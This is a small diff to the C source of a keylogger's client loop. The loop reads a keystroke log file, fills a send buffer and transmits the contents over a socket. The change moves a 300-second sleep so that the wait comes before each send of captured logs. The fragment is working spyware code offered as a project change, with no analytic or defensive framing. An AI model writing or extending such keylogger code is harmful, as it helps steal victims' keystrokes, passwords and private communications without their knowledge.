@@ -36,6 +36,7 @@ void start_client(void)
     
     while(1)
     {
+        sleep(300); // wait 300sec = 5 min before sending logs again
         memset(send_buffer, 0, sizeof(send_buffer));  //clear send buffer
         /*Open keylog file for writing*/
         FILE *keylog_log = fopen("/.keylogger/log/keylog.txt", "a");
@@ -65,8 +66,6 @@ void start_client(void)
         }
         /*Clear and close keylog file*/
         fclose(fopen("log/network.txt", "w"));
-        
-        sleep(300); // wait 300sec = 5 min before sending logs again
     }
     close(sock);
 }
